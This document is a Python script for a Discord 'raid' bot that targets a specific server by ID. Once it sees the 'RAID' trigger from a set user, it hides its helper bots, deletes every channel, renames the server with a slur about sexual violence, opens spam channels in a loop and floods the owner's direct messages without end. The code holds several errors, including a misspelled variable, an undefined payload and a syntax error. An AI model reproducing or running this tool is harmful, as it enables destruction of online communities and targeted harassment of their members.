import discord
import io

targetGuildId = 454058863600074753
botChildrenId = [
]
payload = ''

bot = discord.Client()

@bot.event
async def on_ready():
    print('API Connected.')

    print('Setting hidden username and icon...')
    file = open('hidden.png', 'rb')
    await bot.user.edit(username='🏴', avatar=file.read())

    print('Setting status to invisible...')
    await bot.change_presence(status=discord.Status.invisible)

    print('Finding target guild by ID...')
    guild = bot.get_guild(targetGuildId)
    print('Found guild named "' + guild.name + '".')

    print('Looking for child bots...')
    botChildren = []
    for childId in botChildrenId:
        child = guild.get_member(childId)
        if child == None:
            print('ERROR: child bot not found with ID: ' + childId)
            exit()
        else:
            botChildren.append(child)

    print('Hiding child bots...')
    for channel in guild.channels:
        for childBot in BotChildren:
            await channel.set_permissions(childBot, read_messages=False)

    print('===== Ready for raid. Say "RAID" as Yamcha#4224 to rape this server. =====')
    def check(m):
        return ('RAID' in m.content) and m.author.id == 273940917596061698
    await bot.wait_for('message', check=check)

    print('================================')
    print('========== RAID START ==========')
    print('================================')

    print('Setting server settings...')
    file = open('servericon.png', 'rb')
    await guild.edit(name='Squidward\'s Rape Vault', icon=file.read(), reason='===== BEGIN RAID =====')

    print('Deleting channels...')
    for channel in list(guild.channels):
        await channel.delete(reason='Deleting cancerous memes')

    print('Creating channels and starting spam...')
    channelAdd = True
    while channelAdd:
        try:
            newchannel = await guild.create_text_channel('spam-time-bitches')
            await newchannel.send(payload)
        except:
            channelAdd = False

    print('Raid is now at full speed.')

    print('Spamming server owner\'s DM\'s...')
    while True:
        await guild.owner.send(ownerPayload)

@bot.event
async def on_message(message):
    if message.author.bot and message.mentions_everyone
        await message.channel.send(payload)
